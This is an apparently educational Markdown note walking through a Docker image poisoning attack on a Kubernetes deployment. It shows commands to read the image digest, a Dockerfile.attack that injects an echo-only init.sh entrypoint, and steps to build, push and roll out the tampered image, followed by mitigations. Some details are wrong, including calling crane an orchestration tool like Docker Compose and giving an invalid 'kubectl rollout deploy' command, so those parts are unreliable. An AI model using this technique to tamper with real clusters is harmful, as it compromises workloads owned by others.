---
Author:
  - Kumail Rizvi
Author Profile:
  - https://linkedin.com/in/kumail-rizvi
tags:
  - Kubernetes
  - docker
  - security
Creation Date: 2024-08-22T02:46:07
Last Date: 2024-08-22T02:46:07
DocID: KS-1-24
drafts: 
References: 
description:
---

## Poisoning Docker Image  

A scenario where an attacker got access of your kuberentes cluster via token or kube config file 

After gaining access of the cluster ,the hacker will try to exploit the applications and serviced deployed on it 

Lets understand the attack by an example

1. lets say your application running using an image ghcr.io/datosh/demo-token/demo-app:latest
    this image is getting used in `deployment.yaml` 

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: awesome-cats-deployment
  labels:
    app: awesome-cats
spec:
  replicas: 3
  selector:
    matchLabels:
      app: awesome-cats
  template:
    metadata:
      labels:
        app: awesome-cats
    spec:
      containers:
      - name: awesome-cats-container
        image: ghcr.io/datosh/demo-token/demo-app:latest
        ports:
        - containerPort: 8080

```


Also we have `service.yaml`

```yaml
apiVersion: v1
kind: Service
metadata:
  name: awesome-cats-service
  labels:
    app: awesome-cats
spec:
  type: NodePort
  selector:
    app: awesome-cats
  ports:
  - port: 8080
    targetPort: 8080
    nodePort: 30080
```

2. **Before Attack** , your application is running pretty well  , the logs of the deployment is also healthy  

```
kubectl logs -f deployments/awesome-cats-deployment
127.0.0.1 - - [11/Jul/2024 06:17:22] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [11/Jul/2024 06:17:27] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [11/Jul/2024 06:17:30] "GET / HTTP/1.1" 200 -

```

3. Now once the attacker got inside of the cluster ,now he will inject the container with malicious script or just an echo command to show that he got into the cluster and can increase the blast radius of the attack .

4. Now he will check for the image been used in the deployment yaml ,using a simple describe command 

```console
$ kubectl describe deployments awesome-cats-deployment | grep "Image"
Image:        ghcr.io/datosh/demo-token/demo-app:latest
```

5.  Here he can easily get the image name being used in the deployment ,the attacker will get the `SHA` which is the image digest , for example it would be something like this 

```
crane digest ghcr.io/datosh/demo-token/demo-app:latest
```

crane is a powerful Docker orchestration tool similar to Docker Compose with extra features.  if not crane then with a docker command a `SHA` can be fetched 

```
$ docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/datosh/demo-token/demo-app:latest
ghcr.io/datosh/demo-token/demo-app:latest@sha256:67836d1041abaafa1741b45f0b88abced60924d423c6952743148c302098d2d3
```

6. if you notice the output we can see the `SHA`  with image name its something like this `67836d1041abaafa1741b45f0b88abced60924d423c6952743148c302098d2d3`

### What is a SHA or image digest ??

7.  A `SHA` or `image digest`  is like a digital fingerprint which is unique and its get created when ever we create any images in docker , every `image digest`  is unique for every images 

8. Now the attacker will use this information to create an extended dockerfile that would contain of a malicious code or a echo script 

Here we named the Dockerfile as `Dockerfile.attack`

```dockerfile
ARG REPO=ghcr.io/datosh/demo-token/demo-app
ARG SHA=67836d1041abaafa1741b45f0b88abced60924d423c6952743148c302098d2d3

FROM ${REPO}@${SHA}

RUN echo 'echo xx Im in your system  xx' >> init.sh
RUN chmod +x init.sh

ENTRYPOINT ["bash", "-c", "/init.sh && python3 -m http.server 8080 -d cats"]
```

Here you can see how the attacker created an `init.sh`  and its running an echo command , this is just an example , the attacker can run anything to try to affect the application such as crashing down services , application , or locking down the cluster 

9. This `init.sh` is passed through an Entrypoint in the dockerfile 

10.  Now the image will be builded and this image will be pushed to the container registry and then passed to the container 

```docker
docker build --build-arg SHA=${SHA} -t ${CONTAINER_REPO}:latest -f Dockerfile.attack .   
```

11.  After the image getting build , the attack will scale down the deployment and and rollout the deployment 

```console
kubectl scale deploy awesome-cats --replicas=0

$ kubectl rollout  deploy awesome-cats-deployment

deployment "awesome-cats-deployment" successfully rolled out
```

12. After successfully rolling out the deployment ,even though the application from frontend side will be running as expected 

We can check by doing curl of the URL 

``` console
$ curl https://kumailr7.github.io/Opscatalyst///                      
<!DOCTYPE html>
<html lang="en">
<meta charset="UTF-8">
<title>Awesome Cats</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="stylesheet" href="">
<style>
</style>
<script src=""></script>

<body>
    <img src="cat1.jpg" alt="Cat">
    <img src="cat2.jpg" alt="Cat">
    <img src="cat3.jpg" alt="Cat">
</body>

</html>

```

13. But the real attack took place behind the scene ,if we check the logs of the deployment we will see it 

```
$ kubectl logs -f deployments/awesome-cats-deployment
Found 3 pods, using pod/awesome-cats-deployment-b7dd856cd-9nfn2
⚔⚔ Im in your system ⚔⚔
127.0.0.1 - - [11/Jul/2024 06:17:40] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [11/Jul/2024 06:17:47] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [11/Jul/2024 06:17:50] "GET / HTTP/1.1" 200 -
```

Here we can see the attacker was able to successfully run the attack and infect the container 

15. Even the image name with tag is same as before ,we will not able to find the find difference looking at the image tag ,so can we see the difference ? 

16.  As discussed earlier about `image digest` lets check it 

```
$ docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/datosh/demo-token/demo-app:latest 
ghcr.io/datosh/demo-token/demo-app@sha256:3ee5995cd4002a753e095a23e214da9b0e155a3e331437c9568ff2f4009d92b
```

If you have noticed something the image digest is changed ,so we can verify that the SHA has been tampered and the image is been manipulated

---

### Understanding Attack 

1.  Leaked container registry credentials 
2. Protect external cluster-external dependencies 
   -  Container registries 
   - Config Repositories
   - Deployment pipelines & Secret Managers for token and config files

### Mitigation

1. Pin by Hash `(SHA)`
  -  Do not use `latest` or even version  tags 
2.  Always do a container singing 
3. implement rotation of short lived secrets regularly
4.  Use Image Scanning tools like Docker Scout ,Trivy or Synk to scan image for vulnerabilities  

By following these best practices  we can prevent attacker to infect container and also save guard applications  

---
